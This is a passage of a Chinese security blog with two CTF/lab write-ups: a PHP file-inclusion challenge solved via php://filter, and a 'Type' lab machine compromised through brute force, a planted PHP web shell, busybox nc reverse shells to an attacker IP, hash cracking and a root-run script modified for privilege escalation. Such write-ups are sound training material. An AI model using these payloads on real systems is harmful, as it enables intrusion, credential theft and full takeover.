-            <a href="/2026/05/02/BUUCTF/WEB/3-php%E7%BB%95%E8%BF%87-Secret%20File/" class="post-title-link" itemprop="url">Secret File - PHP文件包含漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-05-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-02T00:00:00+08:00">2026-05-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-05-03 12:50:33" itemprop="dateModified" datetime="2026-05-03T12:50:33+08:00">2026-05-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/" itemprop="url" rel="index"><span itemprop="name">BUUCTF</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/BUUCTF/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Secret-File-PHP文件包含漏洞"><a href="#Secret-File-PHP文件包含漏洞" class="headerlink" title="Secret File - PHP文件包含漏洞"></a>Secret File - PHP文件包含漏洞</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
-<li><strong>题目类型</strong>: Web - PHP文件包含</li>
-<li><strong>题目地址</strong>: <a target="_blank" rel="noopener" href="http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/">http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/</a></li>
-</ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="第一步：信息收集"><a href="#第一步：信息收集" class="headerlink" title="第一步：信息收集"></a>第一步：信息收集</h3><p>首先访问主页，发现是一个简单的页面，提示”你想知道蒋璐源的秘密么？”</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/</span><br></pre></td></tr></table></figure>
-
-<p>查看页面源代码，发现有一个隐藏的链接指向 <code>./Archive_room.php</code></p>
-<h3 id="第二步：探索隐藏链接"><a href="#第二步：探索隐藏链接" class="headerlink" title="第二步：探索隐藏链接"></a>第二步：探索隐藏链接</h3><p>访问 <code>Archive_room.php</code>，发现有一个SECRET按钮，链接到 <code>action.php</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/Archive_room.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="第三步：发现源码泄露"><a href="#第三步：发现源码泄露" class="headerlink" title="第三步：发现源码泄露"></a>第三步：发现源码泄露</h3><p>访问 <code>action.php</code> 时，虽然页面会302跳转到 <code>end.php</code>，但查看源代码发现了关键线索：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/action.php</span><br></pre></td></tr></table></figure>
-
-<p>返回的HTML注释中暴露了 <code>secr3t.php</code>：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   secr3t.php        </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="第四步：获取关键源码"><a href="#第四步：获取关键源码" class="headerlink" title="第四步：获取关键源码"></a>第四步：获取关键源码</h3><p>访问 <code>secr3t.php</code>，获得了关键源码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/secr3t.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="第五步：利用文件包含漏洞"><a href="#第五步：利用文件包含漏洞" class="headerlink" title="第五步：利用文件包含漏洞"></a>第五步：利用文件包含漏洞</h3><p>源码中存在文件包含漏洞，过滤了以下内容：</p>
-<ul>
-<li><code>../</code> - 目录遍历</li>
-<li><code>tp</code> - 阻止 <code>php://</code> 协议</li>
-<li><code>input</code> - 阻止 <code>php://input</code></li>
-<li><code>data</code> - 阻止 <code>data://</code> 协议</li>
-</ul>
-<p><strong>绕过方法</strong>：使用 <code>php://filter</code> 伪协议读取文件（注意<code>php://filter</code>不包含被过滤的字符串）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://a199f39c-ee58-4448-8be1-a518f3f98964.node5.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>返回base64编码的flag.php源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4K...（省略）</span><br></pre></td></tr></table></figure>
-
-<h3 id="第六步：解码获取Flag"><a href="#第六步：解码获取Flag" class="headerlink" title="第六步：解码获取Flag"></a>第六步：解码获取Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PCFET0NUWVBFIGh0bWw+...&#x27;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
-
-<p>解码后得到flag.php的完整源码，其中包含：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;1ff51255-f733-4b89-8dbc-98cae1493181&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<h2 id="最终Flag"><a href="#最终Flag" class="headerlink" title="最终Flag"></a>最终Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1ff51255-f733-4b89-8dbc-98cae1493181&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="1-PHP文件包含漏洞-LFI-RFI"><a href="#1-PHP文件包含漏洞-LFI-RFI" class="headerlink" title="1. PHP文件包含漏洞 (LFI&#x2F;RFI)"></a>1. PHP文件包含漏洞 (LFI&#x2F;RFI)</h3><ul>
-<li><strong>LFI (Local File Inclusion)</strong>: 本地文件包含，可以读取服务器上的任意文件</li>
-<li><strong>RFI (Remote File Inclusion)</strong>: 远程文件包含，可以包含远程服务器上的文件（需要allow_url_include开启）</li>
-</ul>
-<h3 id="2-PHP伪协议"><a href="#2-PHP伪协议" class="headerlink" title="2. PHP伪协议"></a>2. PHP伪协议</h3><ul>
-<li><p><strong>php:&#x2F;&#x2F;filter</strong>: 用于读取和过滤数据流</p>
-<ul>
-<li><code>read=convert.base64-encode</code>: 将文件内容base64编码后输出</li>
-<li><code>resource=文件名</code>: 指定要读取的文件</li>
-</ul>
-<p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>php:&#x2F;&#x2F;input</strong>: 可以访问原始的POST数据</p>
-</li>
-<li><p><strong>data:&#x2F;&#x2F;</strong>: 可以执行内嵌的PHP代码</p>
-</li>
-</ul>
-<h3 id="3-常见过滤绕过"><a href="#3-常见过滤绕过" class="headerlink" title="3. 常见过滤绕过"></a>3. 常见过滤绕过</h3><table>
-<thead>
-<tr>
-<th>过滤字符串</th>
-<th>绕过方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>../</code></td>
-<td><code>....//</code>、<code>..%2f..%2f</code>、<code>%2e%2e/</code></td>
-</tr>
-<tr>
-<td><code>php://</code></td>
-<td>使用 <code>php://filter</code>（不含被过滤字符时）</td>
-</tr>
-<tr>
-<td><code>data</code></td>
-<td>使用其他协议</td>
-</tr>
-</tbody></table>
-<h3 id="4-信息收集技巧"><a href="#4-信息收集技巧" class="headerlink" title="4. 信息收集技巧"></a>4. 信息收集技巧</h3><ul>
-<li>查看页面源代码（隐藏链接、注释信息）</li>
-<li>查看HTTP响应头（可能暴露版本信息）</li>
-<li>访问常见文件（robots.txt、.git、.svn等）</li>
-<li>使用Burp Suite等工具拦截请求</li>
-</ul>
-<h3 id="5-常用命令"><a href="#5-常用命令" class="headerlink" title="5. 常用命令"></a>5. 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看页面内容</span></span><br><span class="line">curl -s URL</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看HTTP响应头</span></span><br><span class="line">curl -sI URL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64解码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;base64字符串&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL编码</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;../&#x27;</span> | xxd -plain | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | sed <span class="string">&#x27;s/../%&amp;/g&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
-<li>避免直接使用用户输入作为文件包含的参数</li>
-<li>使用白名单机制，只允许包含指定的文件</li>
-<li>关闭危险配置：<code>allow_url_include = Off</code></li>
-<li>使用<code>realpath()</code>函数验证文件路径</li>
-<li>对输入进行严格的过滤和验证</li>
-</ol>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">PHP手册 - 支持的协议和封装协议</a></li>
-<li><a target="_blank" rel="noopener" href="https://ctf-wiki.org/web/php/include/">CTF Wiki - 文件包含</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/QQGroup/Type/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/QQGroup/Type/" class="post-title-link" itemprop="url">Type</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:26" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/QQGroup/" itemprop="url" rel="index"><span itemprop="name">QQGroup</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cewl http://type.dsz &gt; pass.txt</span><br><span class="line"><span class="built_in">cat</span> pass.txt</span><br><span class="line"><span class="built_in">cat</span> pass.txt|grep <span class="string">&#x27;^[A-Z]&#x27;</span> &gt; pass2.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/assets/Pasted%20image%2020260227093556.png"><br><img src="/assets/Pasted%20image%2020260227093628.png"></p>
-<p><a target="_blank" rel="noopener" href="http://type.dsz/index.php/author/1/">http://type.dsz/index.php/author/1/</a><br>用户名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">sburro</span><br><span class="line">plugugly</span><br></pre></td></tr></table></figure>
-<p><img src="/assets/Pasted%20image%2020260227093800.png"><br><img src="/assets/Pasted%20image%2020260227093824.png"><br><img src="/assets/Pasted%20image%2020260227093842.png"></p>
-<ul>
-<li><p>payload1<br><img src="/assets/Pasted%20image%2020260227094215.png"></p>
-</li>
-<li><p>payload2<br><img src="/assets/Pasted%20image%2020260227094149.png"></p>
-</li>
-<li><p>burp爆破发现用户密码<br>  name&#x3D;sburro<br>  password&#x3D;DevNotes<br><img src="/assets/Pasted%20image%2020260227094402.png"></p>
-</li>
-</ul>
-<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p><img src="/assets/Pasted%20image%2020260227094555.png"><br>发现管理标题 有串密钥，推测是管理员密码 <code>2DbYCYpXwvV9kKwO</code></p>
-<h3 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h3><ul>
-<li>控制台-外观</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/assets/Pasted%20image%2020260227095102.png"></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://type.dsz/?0= busybox nc 192.168.43.16 -e /bin/sh</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://www.doubao.com/thread/w22e6a59aec28a8a7">https://www.doubao.com/thread/w22e6a59aec28a8a7</a><br><img src="/assets/Pasted%20image%2020260227095743.png"><br>由于只有sh解释器，这里稳定脚本语句如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/sh&#x27;);&quot;</span></span><br><span class="line">Ctrl+Z <span class="comment">#手动按键盘</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span> </span><br><span class="line">reset</span><br><span class="line"><span class="built_in">stty</span> rows 29 columns 112</span><br><span class="line"><span class="built_in">export</span> TERM=xterm </span><br></pre></td></tr></table></figure>
-
-<h2 id="进入shell分析"><a href="#进入shell分析" class="headerlink" title="进入shell分析"></a>进入shell分析</h2><ul>
-<li>发现user.txt，还有个.hint提示</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/home/plugugly $ <span class="built_in">ls</span> -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-sr-x    2 plugugly plugugly      4096 Feb 23 10:43 .</span><br><span class="line">drwxr-xr-x    3 root     root          4096 Feb 22 23:25 ..</span><br><span class="line">lrwxrwxrwx    1 root     plugugly         9 Feb 23 10:43 .ash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--    1 root     plugugly       111 Feb 23 10:42 .hint</span><br><span class="line">-rw-r--r--    1 root     plugugly        44 Feb 22 23:25 user.txt</span><br><span class="line">/home/plugugly $ <span class="built_in">cat</span> user.txt </span><br><span class="line">flag&#123;user-f1315ee82308853cc1a9402f2cfa6d1c&#125;</span><br><span class="line">/home/plugugly $ <span class="built_in">cat</span> .hint </span><br><span class="line">Can<span class="string">&#x27;t type fast enough? Maybe the system stat bar has a hidden &#x27;</span>Debug Mode<span class="string">&#x27;. Try to knock on it several times.</span></span><br></pre></td></tr></table></figure>
-
-<p>发现有database, 是SQLite</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/data $ <span class="built_in">ls</span> -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x    5 root     root          4096 Feb 22 23:19 .</span><br><span class="line">drwxr-xr-x   22 root     root          4096 Feb 23 10:56 ..</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Feb 22 23:19 certs</span><br><span class="line">drwxrwxrwx    2 root     root          4096 Feb 27 09:57 database</span><br><span class="line">drwxrwxrwx    6 root     root          4096 Feb 23 00:00 typecho</span><br><span class="line">/data $ <span class="built_in">cd</span> database/</span><br><span class="line">/data/database $ <span class="built_in">ls</span></span><br><span class="line">typecho.db</span><br><span class="line">/data/database $ <span class="built_in">ls</span> -la</span><br><span class="line">total 112</span><br><span class="line">drwxrwxrwx    2 root     root          4096 Feb 27 09:57 .</span><br><span class="line">drwxr-xr-x    5 root     root          4096 Feb 22 23:19 ..</span><br><span class="line">-rw-r--r--    1 nobody   nobody      102400 Feb 27 09:57 typecho.db</span><br><span class="line">/data/database $ file typecho.db </span><br><span class="line">typecho.db: SQLite 3.x database, last written using SQLite version 3049002, file counter 382, database pages 25, cookie 0x13, schema 4, UTF-8, version-valid-for 382</span><br></pre></td></tr></table></figure>
-
-<p>访问sqlite</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/data/database $ sqlite3 typecho.db </span><br><span class="line">SQLite version 3.49.2 2025-05-07 10:39:52</span><br><span class="line">Enter <span class="string">&quot;.help&quot;</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">typecho_comments       typecho_metas          typecho_users        </span><br><span class="line">typecho_contents       typecho_options      </span><br><span class="line">typecho_fields         typecho_relationships</span><br><span class="line">sqlite&gt; <span class="keyword">select</span> * from typecho_users</span><br><span class="line">   ...&gt; ;</span><br><span class="line">1|admin|$P<span class="variable">$B</span>/xZAkZ342fLS1sEQwQfsXTVKiBnVG/|admin@type.dsz|http://type.dsz/|admin|1771773701|1772157442|1771815254|administrator|6f9308b9c68ffc22516422bd5b9a32e3</span><br><span class="line">2|sburro|$P<span class="variable">$BfS2sY4Vz6sHjC52095jVAFOjMNyuy1</span>|sburro@type.dsz||sburro|1771774529|1772156834|1771775693|contributor|ae834465efedeb9b6a3b333f321452e2</span><br><span class="line">3|plugugly|$P<span class="variable">$BuyKfLj9xZ0iLez6SomJNOLGx</span>.7g.U/|plugugly@type.dsz||plugugly|1771812079|0|0|subscriber|</span><br><span class="line">sqlite&gt; </span><br></pre></td></tr></table></figure>
-
-<p>因为home下有plugugly用户，所以关注这个用户的hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/data/database $ cd /home</span><br><span class="line">/home $ ls </span><br><span class="line">plugugly</span><br></pre></td></tr></table></figure>
-
-<p>破解hash</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">☁  <span class="built_in">type</span>  <span class="built_in">echo</span> <span class="string">&#x27;$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">☁  <span class="built_in">type</span>  <span class="built_in">cat</span> <span class="built_in">hash</span>                    </span><br><span class="line">$P<span class="variable">$BuyKfLj9xZ0iLez6SomJNOLGx</span>.7g.U/</span><br><span class="line">☁  <span class="built_in">type</span>  john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">2boobies         (?)     </span><br><span class="line">1g 0:00:00:03 DONE (2026-02-27 10:49) 0.3289g/s 32463p/s 32463c/s 32463C/s Dominic1..221180</span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">☁  <span class="built_in">type</span>  john --show <span class="built_in">hash</span>                                     </span><br><span class="line">?:2boobies</span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></table></figure>
-
-<p><code>ssh的用户密码 plugugly  2boobies</code></p>
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> plugugly on Type:</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XAUTHORITY</span><br><span class="line"></span><br><span class="line">Runas and Command-specific defaults <span class="keyword">for</span> plugugly:</span><br><span class="line">    Defaults!/usr/sbin/visudo env_keep+=<span class="string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span></span><br><span class="line"></span><br><span class="line">User plugugly may run the following commands on Type:</span><br><span class="line">    (ALL) NOPASSWD: /root/typer.py</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export XAUTHORITY=/home/plugugly/.Xauthority</span><br><span class="line">sudo /root/typer.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="/assets/Pasted%20image%2020260227112558.png"></p>
-<p>给cleanup_scores.sh加上反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Type:/usr/local/bin$ ls</span><br><span class="line">cleanup_scores.sh</span><br><span class="line">Type:/usr/local/bin$ cat cleanup_scores.sh </span><br><span class="line">#!/bin/sh</span><br><span class="line">busybox nc 192.168.43.16 1111 -e /bin/sh</span><br><span class="line">echo &#x27;Cleanup process started by root...&#x27;</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  nc -lvnp 1111</span><br><span class="line">listening on [any] 1111 ...</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">connect to [192.168.43.16] from (UNKNOWN) [192.168.43.196] 41601</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line"><span class="built_in">cd</span> /usr</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">linpeas.sh</span><br><span class="line">user.txt</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">typer.py</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">flag&#123;root-e0d46f8ca8c65edb6b7d46daeafebe16&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="CEWL：CTF-中必备的密码字典生成工具"><a href="#CEWL：CTF-中必备的密码字典生成工具" class="headerlink" title="CEWL：CTF 中必备的密码字典生成工具"></a>CEWL：CTF 中必备的密码字典生成工具</h1><p><strong>CEWL（发音为”cool”）是Custom Word List generator（自定义单词列表生成器）的缩写</strong>，是一款在CTF（Capture The Flag）夺旗赛中广泛使用的密码字典生成工具，默认集成于Kali Linux等渗透测试系统中。</p>
-<hr>
-<h3 id="核心功能与原理"><a href="#核心功能与原理" class="headerlink" title="核心功能与原理"></a>核心功能与原理</h3><p>CEWL本质是一个网络爬虫，它通过以下方式生成定制化密码字典：</p>
-<ol>
-<li><p>爬行指定URL到设定深度，提取网站内容中的单词</p>
-</li>
-<li><p>可选择跟随外部链接，扩大爬取范围</p>
-</li>
-<li><p>收集页面中mailto链接里的电子邮件地址（可用作用户名）</p>
-</li>
-<li><p>生成仅包含目标网站特有词汇的字典，而非通用字典</p>
-</li>
-</ol>
